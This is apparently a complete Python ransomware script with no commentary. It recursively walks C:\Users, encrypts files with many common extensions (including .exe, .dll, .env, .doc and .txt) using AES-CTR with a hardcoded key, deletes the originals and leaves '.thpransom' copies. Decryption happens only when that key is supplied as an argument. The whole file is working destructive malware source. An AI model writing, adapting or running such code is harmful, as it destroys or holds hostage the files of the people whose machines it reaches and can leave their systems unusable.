import os
import pyaes
import sys


KEY = b"0123456789123456"

EXTS = [".dll",".txt",".doc",".00f3",".exe",".js",".json",".dat",".cfg",".inf",".html",".odc",".bin",".tmp",".log",".env",".accfl",".ini",".mp3",".rsrc",".xml",".ini",".cab"]

def encrypt(file_path): #working

	with open(file_path, "rb") as file:		
		content = file.read()
		aes = pyaes.AESModeOfOperationCTR(KEY)
		encrypted_data = aes.encrypt(content)
		new_file = "{}.thpransom".format(file_path)
		
	os.remove(file_path)	
	
	with open(new_file, "wb") as file:
		file.write(encrypted_data)
	
def decrypt(file_path): #working

	with open(file_path, "rb") as file:
		content = file.read()	
		aes = pyaes.AESModeOfOperationCTR(KEY)
		decrypted_data = aes.decrypt(content)
		new_file = file_path.replace(".thpransom", "")
	
	os.remove(file_path)	
	
	with open(new_file, "wb") as file:
		file.write(decrypted_data)		

system = os.walk("C:\\Users")

for root, dirs, files in system:
	for file in files:
		file_path = os.path.join(root, file)
		if len(sys.argv) > 1:
			if sys.argv[1] == KEY.decode() and os.path.splitext(file)[1] == ".thpransom":
				decrypt(file_path)
		elif os.path.splitext(file)[1] in EXTS and os.path.basename(__file__) != file:
			encrypt(file_path)